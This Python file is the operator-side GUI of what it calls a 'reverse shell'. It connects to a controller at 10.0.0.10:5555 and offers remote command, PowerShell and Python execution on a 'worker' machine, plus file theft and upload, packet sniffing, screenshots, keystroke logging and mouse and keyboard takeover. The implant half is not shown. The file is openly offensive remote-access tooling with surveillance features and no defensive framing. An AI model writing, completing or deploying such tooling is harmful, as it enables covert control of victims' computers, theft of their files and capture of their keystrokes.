from typing import Callable

from flet.core.datatable import DataColumn
from flet.core.dropdown import DropdownOption

from rs_master import Master, listen_to_keys
import flet as ft
from flet.core.types import FontWeight
import random
import threading
Commend = Callable[[],bytes]
def get_options(functions:dict[str,Commend],type:str) -> list[DropdownOption]:
    options_list = []
    if type == "commends":
        for function in functions.keys():
            if function in ["live_stream","press_key_in_worker","control_mouse"]:
                continue
            options_list.append(ft.DropdownOption(key=function))
    else:
        for function in ["press_key_in_worker","control_mouse"]:
            options_list.append(ft.DropdownOption(key=function))
    return options_list
def cmd() -> str:
    return "enter the cmd command you want to run in the worker"
def powershell() -> str:
    return "enter the powershell command you want to run in the worker"
def python() -> str:
    return "enter the python code you want to run in the worker. make sure the spacing is correct and you can enter multiple lines"
def receive_file() -> str:
    return "enter the path of the file you want in the worker side"
def send_file() -> str:
    return "enter the file path you want to send to worker, pick a name for the file in the worker side. separate the two with a \",\""
def sniff_from_worker() -> str:
    return "enter: your filter for the sniffing,the sniffing time, amount of packets. all separated by a \",\" REMEMBER when you are asked to enter the file name the file type is .pcap"



class App:
    def __init__(self):
        self.input_required_functions: dict[str,Callable[[],str]]= {"cmd" : cmd,"python":python,"powershell":powershell,"receive_file":receive_file,"send_file":send_file,"sniff_from_worker":sniff_from_worker}
        self.page: ft.Page | None = None
        self.master = Master("10.0.0.10",5555)
        self.master.connect()
        self.title = ft.Container(
            content=ft.Text("reverse shell", size=40, italic=True, weight=FontWeight.BOLD),
            alignment=ft.alignment.top_center,
            bgcolor=ft.Colors.AMBER,
            margin=10,
            padding=10,
            border_radius=10
        )
        self.commands = ft.Dropdown(
            border=ft.InputBorder.UNDERLINE,
            enable_filter=True,
            editable=True,
            leading_icon=ft.Icons.SEARCH,
            label= "command",
            options= get_options(self.master.functions,"commends")
        )
        self.controls = ft.Dropdown(
            border=ft.InputBorder.UNDERLINE,
            enable_filter=True,
            editable=True,
            leading_icon=ft.Icons.SEARCH,
            label="controls",
            options= get_options(self.master.functions,"controls")
        )
        self.connected_worker=ft.DataTable(
            columns=[
                ft.DataColumn(ft.Text("choose a worker:", size=30, italic=True, weight=FontWeight.BOLD)),
                ft.DataColumn(ft.Text())
            ]
        )
        self.output_box =ft.DataTable(
            vertical_lines=ft.BorderSide(3, ft.Colors.GREY),
            horizontal_lines=ft.BorderSide(1, ft.Colors.BLUE_ACCENT),
            divider_thickness=0,
            data_row_max_height=300,
            width=15000,

            columns=[
                ft.DataColumn(ft.Text("output:", size=30, italic=True, weight=FontWeight.BOLD,
                                      text_align=ft.TextAlign.LEFT)),
            ]

        )
        self.input_for_commends = ft.TextField(
            label= "enter input for your specified commend",
            disabled=True,
            multiline = True,
            min_lines = 1,
            max_lines = 3,
            border=ft.InputBorder.UNDERLINE,
            filled=True,
        )
        self.input_help_dlg = ft.AlertDialog(title="how to input for your specific function:")
        self.exit = False
        self.listen_thread = threading.Thread(target=listen_to_keys, daemon=True)

    def exit_button_pressed(self,e):
        self.exit = True

    def reset(self):
        self.input_for_commends.disabled = True
        self.input_for_commends.value = None
        self.commands.disabled = False
        self.input_help_dlg.content = None
        self.page.update()

    def add_output(self, message:str):
        self.output_box.rows.insert(0,ft.DataRow(
            [ft.DataCell(ft.Text(message,text_align=ft.TextAlign.CENTER))]
        ))
        self.page.update()



    def save_file(self,received: bytes) -> str:
        def check_name(e):
            nonlocal file_name
            nonlocal dlg
            if e.control.value == "" or "." not in e.control.value:
                e.control.value = ""
            else:
                file_name = e.control.value
                self.page.close(dlg)
        file_name = ""
        dlg = ft.AlertDialog(title="please enter a name for your file:", modal=True,
                       content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True, on_submit=check_name))
        self.page.open(dlg)
        while file_name == "":
            continue
        with open(file_name, "wb") as file:
            file.write(received)
        return f"file saved as {file_name}"

    def send_button_pressed(self,e):
        if self.input_for_commends is None:
            return
        function = self.commands.value
        message = self.input_for_commends.value
        message = message.replace(" ","")
        message = message.replace(",",":")
        if function == "send_file" and ":" not in message:
            self.page.open(ft.AlertDialog(content=ft.Text("you must enter a \",\" press the \"?\" for more instructions")))
            return
        received = self.master.run2(function,message.encode())
        if b"error" in received:
            self.add_output(received.decode())
            return
        if function in ["receive_file","sniff_from_worker"]:
            self.save_file(received)
            self.reset()
            return
        self.add_output(received.decode())
        self.reset()

    def choose_command(self,e):
        if self.commands.value is None:
            return
        function = self.commands.value
        if function in self.input_required_functions.keys():
            self.input_for_commends.disabled = False
            self.input_help_dlg.content = ft.Text(self.input_required_functions[function]())
            self.commands.disabled = True
            self.page.update()
        else:
            self.reset()
            if function == "screen_shot":
                self.save_file(self.master.run2(function,function.encode()))
            else:
                while not self.exit:
                    self.add_output(self.master.run2("listen_to_keys", "listen_to_keys".encode()).decode())
                self.exit = False

    def main(self,page:ft.Page):
        self.page = page
        self.page.floating_action_button = ft.FloatingActionButton(
            icon=ft.Icons.CLOSE_SHARP, on_click=self.exit_button_pressed, bgcolor=ft.Colors.RED
        )
        self.page.bgcolor = ft.Colors.BLACK
        self.page.add(
                self.title,
                        ft.Row(
                          [
                              # ft.Container(
                              #     content=ft.ListView(controls=[self.connected_worker]),
                              #     bgcolor=ft.Colors.BLUE_ACCENT,
                              #     alignment=ft.alignment.top_center,
                              #     expand=True,
                              #     margin=10,
                              #     padding=10,
                              #     border_radius=10,
                              # ),
                              ft.VerticalDivider(width=6, thickness=3),
                              ft.Column(
                                  spacing=10,
                                  controls=[
                                      ft.Container(
                                          bgcolor=ft.Colors.BLUE_ACCENT,
                                          margin=10,
                                          padding=10,
                                          border_radius=10,
                                          content=ft.DataTable(
                                              divider_thickness=0,
                                              vertical_lines=ft.BorderSide(color=ft.Colors.BLACK, width=1),
                                              horizontal_lines=ft.BorderSide(color=self.page.bgcolor, width=0),
                                              columns=[
                                                   ft.DataColumn(self.commands),
                                                   ft.DataColumn(ft.IconButton(ft.Icons.ADD_ROUNDED,
                                                                               on_click=self.choose_command,
                                                                               icon_color=ft.Colors.BLACK,
                                                                               tooltip="start your function")),
                                                   ft.DataColumn(ft.IconButton(ft.Icons.QUESTION_MARK_ROUNDED,
                                                                               on_click=lambda e: page.open(
                                                                                   self.input_help_dlg),
                                                                               icon_color=ft.Colors.BLACK,
                                                                               tooltip="how to add")),

                                                   ],
                                              rows=[
                                                  ft.DataRow([ft.DataCell(self.input_for_commends), ft.DataCell(
                                                      ft.IconButton(ft.Icons.ADD_ROUNDED,
                                                                    on_click=self.send_button_pressed,
                                                                    icon_color=ft.Colors.BLACK, tooltip="send input")),
                                                              ft.DataCell(ft.Text())]),
                                              ]

                                          )
                                      ),
                                      ft.Container(

                                          content=self.output_box,
                                          bgcolor=ft.Colors.BLUE_ACCENT,
                                          alignment=ft.alignment.center,
                                          expand=True,
                                          margin=10,
                                          padding=10,
                                          border_radius=10,

                                      ),

                                  ]
                              ),

                              # ft.Container(
                              #     bgcolor=ft.Colors.AMBER,
                              #     margin=10,
                              #     padding=10,
                              #     border_radius=10,
                              #     content=ft.Column(
                              #         [
                              #             ft.DataTable(
                              #               divider_thickness=0,
                              #               vertical_lines = ft.BorderSide(color=ft.Colors.BLACK,width=1),
                              #               horizontal_lines = ft.BorderSide(color=self.page.bgcolor,width=0),
                              #               columns= [ft.DataColumn(self.commands),
                              #                         ft.DataColumn(ft.IconButton(ft.Icons.ADD_ROUNDED, on_click=self.choose_command,icon_color=ft.Colors.BLACK,tooltip="start your function")),
                              #                         ft.DataColumn(ft.IconButton(ft.Icons.QUESTION_MARK_ROUNDED,
                              #                                                     on_click=lambda e: page.open(
                              #                                                         self.input_help_dlg),
                              #                                                     icon_color=ft.Colors.BLACK,
                              #                                                     tooltip="how to add")),
                              #
                              #                         ],
                              #                 rows=[
                              #                     ft.DataRow([ft.DataCell(self.input_for_commends),ft.DataCell(ft.IconButton(ft.Icons.ADD_ROUNDED, on_click=self.send_button_pressed,icon_color=ft.Colors.BLACK,tooltip="send input")),ft.DataCell(ft.Text())]),
                              #                 ]
                              #
                              #             ),
                              #
                              #         ]
                              #     )
                              # )
                          ]
                        )
                      )



        # self.page.add(ft.Container(content=self.commands,bgcolor=ft.Colors.BLACK))
        # self.page.add(ft.IconButton(ft.Icons.ADD_ROUNDED, on_click=self.add_button_clicked,icon_color=ft.Colors.BLACK,tooltip="add your inserted ip's"))
        #.page.add(self.input_for_commends)
        # self.page.add(self.output_box)

ft.app(App().main)